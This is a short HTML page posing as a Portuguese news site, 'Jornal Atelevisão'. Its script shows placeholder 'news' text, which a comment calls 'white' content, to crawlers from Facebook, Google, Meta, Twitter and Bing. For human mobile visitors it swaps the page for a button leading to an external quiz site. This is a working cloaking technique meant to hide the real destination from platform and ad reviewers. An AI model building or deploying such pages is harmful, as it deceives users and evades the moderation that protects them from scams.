<!DOCTYPE html>
<html>
<head>
    <title>Jornal Atelevisão</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        .btn { 
            background: #ff2d55; color: white; padding: 15px 30px; 
            border-radius: 50px; text-decoration: none; display: inline-block;
            margin-top: 20px; font-weight: bold;
        }
    </style>
</head>
<body>
    <!-- Conteúdo "white" para bots -->
    <h1>Últimas Notícias</h1>
    <p>Carregando edição do dia...</p>

    <!-- Redirecionamento condicional -->
    <script>
        // Verifica se NÃO é bot E é dispositivo móvel
        function deveRedirecionar() {
            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            const isBot = /bot|facebook|google|meta|twitter|slurp|bing/i.test(navigator.userAgent);
            return !isBot && isMobile;
        }

        // Se for humano + mobile, mostra botão para o quiz
        if (deveRedirecionar()) {
            document.body.innerHTML = `
                <h1>Quiz Exclusivo</h1>
                <p>Clique no botão abaixo para continuar:</p>
                <a href="https://avelino-star.github.io/Quiz/" class="btn">ACESSAR QUIZ</a>
            `;
        }
    </script>
</body>
</html>
